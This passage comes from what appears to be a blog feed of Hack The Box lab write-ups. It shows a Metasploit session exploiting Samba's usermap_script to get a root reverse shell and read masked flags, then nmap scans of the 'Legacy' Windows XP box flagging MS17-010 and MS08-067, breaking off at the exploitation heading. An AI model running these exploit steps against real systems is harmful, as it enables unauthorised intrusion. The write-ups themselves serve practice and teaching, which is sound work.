</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q
msf5 &gt; search samba

Matching <span style="color:#8be9fd;font-style:italic">Modules</span>
<span style="color:#ff79c6">================</span>

   <span style="color:#6272a4">#   Name                                                 Disclosure Date  Rank       Check  Description</span>
   -   ----                                                 ---------------  ----       -----  -----------
   <span style="color:#bd93f9">0</span>   auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal
   <span style="color:#bd93f9">1</span>   auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow
   <span style="color:#bd93f9">2</span>   auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow
   <span style="color:#bd93f9">3</span>   auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow
   <span style="color:#bd93f9">4</span>   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules
   <span style="color:#bd93f9">5</span>   auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   <span style="color:#bd93f9">6</span>   exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow <span style="color:#ff79c6">(</span>*BSD x86<span style="color:#ff79c6">)</span>
   <span style="color:#bd93f9">7</span>   exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption <span style="color:#ff79c6">(</span>Linux x86<span style="color:#ff79c6">)</span>
   <span style="color:#bd93f9">8</span>   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename<span style="color:#ff79c6">()</span> Arbitrary Module Load
   <span style="color:#bd93f9">9</span>   exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   <span style="color:#bd93f9">10</span>  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   <span style="color:#bd93f9">11</span>  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow <span style="color:#ff79c6">(</span>Linux x86<span style="color:#ff79c6">)</span>
   <span style="color:#bd93f9">12</span>  exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   <span style="color:#bd93f9">13</span>  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba <span style="color:#f1fa8c">&#34;username map script&#34;</span> Command Execution
   <span style="color:#bd93f9">14</span>  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   <span style="color:#bd93f9">15</span>  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow <span style="color:#ff79c6">(</span>Mac OS X PPC<span style="color:#ff79c6">)</span>
   <span style="color:#bd93f9">16</span>  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   <span style="color:#bd93f9">17</span>  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow <span style="color:#ff79c6">(</span>Solaris SPARC<span style="color:#ff79c6">)</span>
   <span style="color:#bd93f9">18</span>  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   <span style="color:#bd93f9">19</span>  exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
   <span style="color:#bd93f9">20</span>  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   <span style="color:#bd93f9">21</span>  exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   <span style="color:#bd93f9">22</span>  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar <span style="color:#bd93f9">6</span> Search Results Buffer Overflow
   <span style="color:#bd93f9">23</span>  exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
   <span style="color:#bd93f9">24</span>  exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   <span style="color:#bd93f9">25</span>  post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations


msf5 &gt; use exploit/multi/samba/usermap_script
msf5 exploit<span style="color:#ff79c6">(</span>multi/samba/usermap_script<span style="color:#ff79c6">)</span> &gt; show options

Module options <span style="color:#ff79c6">(</span>exploit/multi/samba/usermap_script<span style="color:#ff79c6">)</span>:

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#f1fa8c">&#39;file:&lt;path&gt;&#39;</span>
   RPORT   <span style="color:#bd93f9">139</span>              yes       The target port <span style="color:#ff79c6">(</span>TCP<span style="color:#ff79c6">)</span>


Exploit target:

   Id  Name
   --  ----
   <span style="color:#bd93f9">0</span>   Automatic


msf5 exploit<span style="color:#ff79c6">(</span>multi/samba/usermap_script<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> RHOSTS 10.10.10.3
<span style="color:#8be9fd;font-style:italic">RHOSTS</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.3
msf5 exploit<span style="color:#ff79c6">(</span>multi/samba/usermap_script<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LHOST 10.10.14.36
<span style="color:#8be9fd;font-style:italic">LHOST</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.36
msf5 exploit<span style="color:#ff79c6">(</span>multi/samba/usermap_script<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LPORT <span style="color:#bd93f9">8000</span>
<span style="color:#8be9fd;font-style:italic">LPORT</span> <span style="color:#ff79c6">=</span>&gt; <span style="color:#bd93f9">8000</span>
msf5 exploit<span style="color:#ff79c6">(</span>multi/samba/usermap_script<span style="color:#ff79c6">)</span> &gt; run

<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.36:8000:-  -
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP double handler on 0.0.0.0:8000
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Accepted the first client connection...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Accepted the second client connection...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Command: <span style="color:#8be9fd;font-style:italic">echo</span> 7fQvMyanZYFgKFy7;
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Writing to socket A
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Writing to socket B
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Reading from sockets...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Reading from socket B
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> B: <span style="color:#f1fa8c">&#34;7fQvMyanZYFgKFy7\r\n&#34;</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Matching...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> A is input...
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Command shell session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:8000 -&gt; 192.168.99.1:55857<span style="color:#ff79c6">)</span> at 2020-02-21 07:46:05 +0000



ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
whoami
root
shell
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Trying to find binary<span style="color:#ff79c6">(</span>python<span style="color:#ff79c6">)</span> on target machine
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Found python at /usr/bin/python
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using <span style="color:#f1fa8c">`</span>python<span style="color:#f1fa8c">`</span> to pop up an interactive shell

sh-3.2# whoami
root
cat /root/root.txt
92c*************************e9df
sh-3.2# ls /home
ls /home
ftp  makis  service  user
sh-3.2# ls /home/makis/
ls /home/makis/
user.txt
sh-3.2# cat /home/user/makis/user.txt
cat /home/makis/user.txt
694*************************84c5
sh-3.2#
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Legacy</title><link>https://0xade1.github.io/posts/2020/04/htb-legacy/</link><pubDate>Sat, 11 Apr 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/04/htb-legacy/</guid><description>Reconnaissance 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # Nmap 7.60 scan initiated Fri Feb 21 02:26:34 2020 as: nmap -Pn -sC -sV -oA nmap/legacy 10.10.10.4 Nmap scan report for 10.10.10.4 Host is up (0.24s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 3389/tcp closed ms-wbt-server Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: mean: 5d01h59m29s, deviation: 0s, median: 5d01h59m29s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:65:1e (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\x00 | Workgroup: HTB\x00 |_ System time: 2020-02-26T06:27:07+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed.</description><content type="html"><![CDATA[<h1 id="reconnaissance">Reconnaissance</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
<span style="color:#6272a4"># Nmap 7.60 scan initiated Fri Feb 21 02:26:34 2020 as: nmap -Pn -sC -sV -oA nmap/legacy 10.10.10.4</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.4
Host is up <span style="color:#ff79c6">(</span>0.24s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">997</span> filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d01h59m29s, deviation: 0s, median: 5d01h59m29s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:65:1e <span style="color:#ff79c6">(</span>VMware<span style="color:#ff79c6">)</span>
| smb-os-discovery:
|   OS: Windows XP <span style="color:#ff79c6">(</span>Windows <span style="color:#bd93f9">2000</span> LAN Manager<span style="color:#ff79c6">)</span>
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">00</span>
|   Workgroup: HTB<span style="color:#f1fa8c">\x</span><span style="color:#bd93f9">00</span>
|_  System time: 2020-02-26T06:27:07+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style="color:#ff79c6">(</span>dangerous, but default<span style="color:#ff79c6">)</span>
|_smb2-time: Protocol negotiation failed <span style="color:#ff79c6">(</span>SMB2<span style="color:#ff79c6">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#6272a4"># Nmap done at Fri Feb 21 02:31:48 2020 -- 1 IP address (1 host up) scanned in 314.20 seconds</span>
</code></pre></td></tr></table>
</div>
</div><p>port 445 is open and detected OS is Microsoft XP which is not receiving security updates for many years and therefore likely vulnerable to Eternal Blue attack used by Wannacry ransomware.</p>
<p>Best approach would be to attempt some very common exploit on SMB protocol which are available on Metasploit framework.</p>
<p>We can further assess SMB vulnerability on port 445 with nmap</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.60 scan initiated Fri Feb 21 02:54:35 2020 as: nmap --script=vuln -oA nmap/legacy-smb-vulns -p445 -Pn 10.10.10.4</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.4
Host is up <span style="color:#ff79c6">(</span>0.29s latency<span style="color:#ff79c6">)</span>.

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution <span style="color:#ff79c6">(</span>MS08-067<span style="color:#ff79c6">)</span>
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows <span style="color:#bd93f9">2000</span> SP4, XP SP2 and SP3, Server <span style="color:#bd93f9">2003</span> SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and <span style="color:#bd93f9">7</span> Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#ff79c6">=</span>CVE-2008-4250
|_smb-vuln-ms10-054: <span style="color:#8be9fd;font-style:italic">false</span>
|_smb-vuln-ms10-061: ERROR: Script execution failed <span style="color:#ff79c6">(</span>use -d to debug<span style="color:#ff79c6">)</span>
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#ff79c6">(</span>ms17-010<span style="color:#ff79c6">)</span>
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers <span style="color:#ff79c6">(</span>ms17-010<span style="color:#ff79c6">)</span>.
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#ff79c6">=</span>CVE-2017-0143

<span style="color:#6272a4"># Nmap done at Fri Feb 21 02:54:54 2020 -- 1 IP address (1 host up) scanned in 19.11 seconds</span>
</code></pre></td></tr></table>
</div>
</div><p>Two major vulnerabilities are identified: MS17-010 and MS08-067</p>
<p>The most recent being 2017, there should be no patch for Windows XP due to end of support</p>
<h1 id="exploitation">Exploitation</h1>
<h2 id="metasploit">Metasploit</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
